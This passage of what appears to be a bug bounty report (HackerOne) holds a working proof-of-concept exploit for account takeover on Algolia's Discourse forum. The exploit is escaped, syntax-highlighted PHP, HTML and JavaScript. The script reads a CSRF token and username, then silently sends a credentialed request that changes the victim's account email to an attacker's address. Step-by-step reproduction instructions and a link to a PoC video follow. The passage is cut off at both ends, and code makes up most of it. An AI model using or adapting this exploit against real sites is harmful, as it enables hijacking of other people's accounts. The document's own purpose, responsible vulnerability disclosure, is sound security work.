class=\"nv\"\u003e$discourse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$file\u003c/span\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eonerror=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;f()\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003euser\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003echange_email_to\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$email_to_change_to\u003c/span\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003efetch\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e?fetch=1\u0026amp;f=\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$rand\u003c/span\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003ethen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etext\u003c/span\u003e\u003cspan class=\"p\"\u003e()}).\u003c/span\u003e\u003cspan class=\"nx\"\u003ethen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eerror\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eYou are currently running the PHP on a different Cloudflare region\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003euser\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esplit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetElementById\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ef\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eaction\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$discourse\u003c/span\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/users/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"nx\"\u003euser\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/preferences/email\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003esubmitRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esplit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003esubmitRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecsrf\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eXMLHttpRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eonerror\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereadyState\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereadyState\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eAccount email for \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003euser\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e has been changed to: \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003echange_email_to\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e};\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ePOST\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$discourse\u003c/span\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"s2\"\u003e/users/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"nx\"\u003euser\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e/preferences/email.json\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esetRequestHeader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eAccept\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003etext\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u003c/span\u003e\u003cspan class=\"s2\"\u003e/html\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esetRequestHeader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eapplication\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u003c/span\u003e\u003cspan class=\"s2\"\u003e/x-www-form-urlencoded\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ewithCredentials\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ebody\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e_method=PUT\u0026amp;email=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003eencodeURIComponent\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003echange_email_to\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026amp;authenticity_token=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003eencodeURIComponent\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecsrf\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eaBody\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nb\"\u003eUint8Array\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"nx\"\u003eaBody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eaBody\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003echarCodeAt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \n  \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eBlob\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"nx\"\u003eaBody\u003c/span\u003e\u003cspan class=\"p\"\u003e]));\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;f\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026amp;#95;method\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;PUT\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;email\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$email_to_change_to\u003c/span\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;authenticity\u0026amp;#95;token\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;csrf\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;display: none;\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Submit request\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      Please wait...\n    \u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd the flow looks like this:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eSign up for Algolia at \u003ca title=\"https://www.algolia.com/users/sign_up\" href=\"/redirect?url=https%3A%2F%2Fwww.algolia.com%2Fusers%2Fsign_up\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.algolia.com/users/sign_up\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eWhen done, go to \u003ca title=\"https://discourse.algolia.com/\" href=\"/redirect?url=https%3A%2F%2Fdiscourse.algolia.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://discourse.algolia.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and \u0026quot;Log in\u0026quot;\u003c/li\u003e\n\u003cli\u003eMake sure the PHP-file is running on the same CloudFlare region, you can try it locally by: \u003ccode\u003ephp -S localhost:8000 algolia.php\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eChange the email address in the PHP-script to something else maybe, so you see that you indeed get the confirmation email sent to the new address to confirm the change.\u003c/li\u003e\n\u003cli\u003eGo to \u003ccode\u003ehttp://localhost:8000\u003c/code\u003e in Firefox.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eYou should see an alert that the email was changed. This is also the point when the attacker gets a \u0026quot;Confirm your new address\u0026quot; to their inbox as my video shows.\u003c/p\u003e\n\n\u003cp\u003ePoC-video:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"AlgoliaTakeover.mp4\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/253/981/8531fd700671a5b86646925d06969b7af7670bf0/AlgoliaTakeover.mp4?response-content-disposition=attachment%3B%20filename%3D%22AlgoliaTakeover.mp4%22%3B%20filename%2A%3DUTF-8%27%27AlgoliaTakeover.mp4\u0026amp;response-content-type=video%2Fmp4\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4HB4ZZGG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T051452Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFBKbMTaGKwVCK0x7JNAOijlMVw%2BhW%2FIG%2FoSYnjiHiHKAiALX1HXrCEc%2FI%2FnVrq803X%2FALiQpBxAlCHE%2Bh8zwqcfmSq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM1pLsQIVwlUu9%2FWdzKpEDno5dfN3IVf%2B7OsdAYS9SWEsPaEcB2YetTOtoMoT8QkXafStRJxQSEckvansRxadLw3NEtOPJvUCKQ1FSfSh7PFvC6uVfFJETqBnLL3fMQIGcAQZlOES1A7KCuxJT2s%2FayJYm9KXYzydI49kvJbjn3MhPgu4OzSnr601lrMTBegiJpfNO%2B%2FeSktzRhCINpAxF%2F2a4j2lstKLfaje8wR6hRJqdSRWJF9M8hMiccij8fb6xzNCHJahS%2BfaEo7RLAy5%2FPpBxYVi3ogO%2Bi%2F4BRT3eb1Z9RpGG9qNkGuyY7ce3DvMgdTkSjHBcsYXBywd8fd%2BaBZwWJd5uw351hwVm22gEjaBsMXjDBuKYWVQcA%2BrEoUuOGGuH6bDr%2B2WdDMHHXX7MgZgH7ziMbq2HG%2FZKMv1Xym51QlR6qp3%2BP6Xz3oMScAiG6Dqm%2FjDmNx9bwBHdu7tvsWABnhe6esdM9Fno0WZ3lIkHOq4HRIf10Qe%2BDDAUhhVc45YNdWlThBy0I6Le7VinfP6o%2F%2BKPpdhWEDht%2BPKwSuwwvNGq%2FwU67AHczVFtKf2TPLO9ophgOhkJ%2BZe077T3hvPbRZ7D4GzMnizYODRG9nQWzx68CzHlMuom3RU16aBeESIBNhc9NjST%2Bt3Bw%2FkvdjiPIAwfnnl0ATW5KpAuIAujTjCnWWC5x9o79v0x9%2Bnkl%2BlSYo41rg7HDE%2BhHWG7fKOUzGpWpyUJFwUo4XO2BBz%2F9JPwjpoD5vZa6vKnLi1NmWkYRn1R6E4QMqIGHABVzTr2BlnRNMM7IY6DbFqrNpuXMJjVs26ZuTl70H1lwMzeG43ORGVGlYhsYokTZrRPzq8ZdhxoEwkFN0OgfU2QSH1HVj5iow%3D%3D\u0026amp;X-Amz-Signature=e0a50d36ac6919c05c3c46ea32a7c15ad90d2f5eaae3771da1215e16b2226f68\" data-attachment-type=\"video/mp4\"\u003e\u003cvideo controls=\"controls\" src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/253/981/8531fd700671a5b86646925d06969b7af7670bf0/AlgoliaTakeover.mp4?response-content-disposition=attachment%3B%20filename%3D%22AlgoliaTakeover.mp4%22%3B%20filename%2A%3DUTF-8%27%27AlgoliaTakeover.mp4\u0026amp;response-content-type=video%2Fmp4\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4HB4ZZGG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T051452Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFBKbMTaGKwVCK0x7JNAOijlMVw%2BhW%2FIG%2FoSYnjiHiHKAiALX1HXrCEc%2FI%2FnVrq803X%2FALiQpBxAlCHE%2Bh8zwqcfmSq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM1pLsQIVwlUu9%2FWdzKpEDno5dfN3IVf%2B7OsdAYS9SWEsPaEcB2YetTOtoMoT8QkXafStRJxQSEckvansRxadLw3NEtOPJvUCKQ1FSfSh7PFvC6uVfFJETqBnLL3fMQIGcAQZlOES1A7KCuxJT2s%2FayJYm9KXYzydI49kvJbjn3MhPgu4OzSnr601lrMTBegiJpfNO%2B%2FeSktzRhCINpAxF%2F2a4j2lstKLfaje8wR6hRJqdSRWJF9M8hMiccij8fb6xzNCHJahS%2BfaEo7RLAy5%2FPpBxYVi3ogO%2Bi%2F4BRT3eb1Z9RpGG9qNkGuyY7ce3DvMgdTkSjHBcsYXBywd8fd%2BaBZwWJd5uw351hwVm22gEjaBsMXjDBuKYWVQcA%2BrEoUuOGGuH6bDr%2B2WdDMHHXX7MgZgH7ziMbq2HG%2FZKMv1Xym51QlR6qp3%2BP6Xz3oMScAiG6Dqm%2FjDmNx9bwBHdu7tvsWABnhe6esdM9Fno0WZ3lIkHOq4HRIf10Qe%2BDDAUhhVc45YNdWlThBy0I6Le7VinfP6o%2F%2BKPpdhWEDht%2BPKwSuwwvNGq%2FwU67AHczVFtKf2TPLO9ophgOhkJ%2BZe077T3hvPbRZ7D4GzMnizYODRG9nQWzx68CzHlMuom3RU16aBeESIBNhc9NjST%2Bt3Bw%2FkvdjiPIAwfnnl0ATW5KpAuIAujTjCnWWC5x9o79v0x9%2Bnkl%2BlSYo41rg7HDE%2BhHWG7fKOUzGpWpyUJFwUo4XO2BBz%2F9JPwjpoD5vZa6vKnLi1NmWkYRn1R6E4QMqIGHABVzTr2BlnRNMM7IY6DbFqrNpuXMJjVs26ZuTl70H1lwMzeG43ORGVGlYhsYokTZrRPzq8ZdhxoEwkFN0OgfU2QSH1HVj5iow%3D%3D\u0026amp;X-Amz-Signature=e0a50d36ac6919c05c3c46ea32a7c15ad90d2f5eaae3771da1215e